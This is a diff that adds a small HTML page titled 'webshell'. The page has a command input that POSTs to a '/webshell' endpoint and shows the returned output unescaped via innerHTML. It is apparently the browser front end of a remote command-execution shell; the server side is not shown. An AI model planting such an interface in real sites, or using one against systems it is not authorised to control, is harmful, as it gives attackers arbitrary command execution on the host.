@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <title>webshell</title>
+    <script src="/static/js/jquery.min.js"></script>
+</head>
+<body>
+<form id="Shell" name="Shell" action="/webshell" method="post">
+    <input type="text" class="form-control" id="cmd" name="cmd" placeholder="command" value=""/>
+    <button type="submit" id="send" class="send">执行</button>
+</form>
+<p><br/></p>
+<p style="white-space: pre-line;"><span id="result"></span></p>
+<script>
+    $(function () {
+        $("#Shell").submit(function () {
+            $.ajax({
+                type: "POST",
+                url: "/webshell",
+                data: $("#Shell").serialize(),
+                success: function (data) {
+                    document.getElementById("result").innerHTML = data.res;
+                },
+                error: function (data) {
+                    document.getElementById("result").innerHTML = "Error";
+                }
+            });
+            return false;
+        });
+    });
+</script>
+</body>
+</html>
